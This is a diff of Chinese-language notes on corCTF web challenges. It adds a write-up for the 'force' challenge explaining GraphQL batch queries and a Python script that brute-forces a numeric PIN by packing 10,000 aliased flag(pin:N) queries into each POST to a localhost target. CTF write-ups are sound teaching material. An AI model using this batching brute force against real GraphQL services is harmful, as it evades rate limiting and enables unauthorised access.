@@ -1,5 +1,6 @@
 # web
 ### force
+#GraphQL
 核心代码
 ```js
 const secret = randomInt(0, 10 ** 5); // 1 in a 100k??
@@ -50,6 +51,61 @@ Connection: close
 不知道怎么绕过...
 
 ---
+
+GraphQL的特性是支持一条http请求里执行多个查询也就是`batch query`
+https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html#batching-attacks
+```python
+{
+batch1:flag(pin:0)
+
+batch2:flag(pin:1)
+}
+```
+
+*python*
+```python
+import requests
+import json
+
+min = 0
+max = 10000
+
+def batch_loop(min, max):
+    data = ''
+    for x in range(min,max,1):
+        data = data + f'batch{x+1}:flag(pin:{x})\r\n'
+
+    return data
+    
+headers = {
+    'Content-Type': 'text/plain;charset=UTF-8'
+}
+
+
+
+while True:
+    data = batch_loop(min, max)
+    data_g = '{\n'+data+'\n}'
+    
+    r = requests.post('http://localhost:8090',headers=headers,data=data_g)
+    
+    if 'corctf' in r.text:
+        jsonFormat = json.loads(r.text)
+        for key, val in jsonFormat['data'].items():
+            if val != 'Wrong!':
+                print(f'flag: {val}')
+        break
+        
+    min = min + 10000
+    max = max + 10000
+
+    if max > 100000:
+        print('failed.')
+        break
+    else:
+        print('retrying...')
+```
+
 ### msfrognymize
 一个上传图片后对可以对人脸进行打码的网站
 
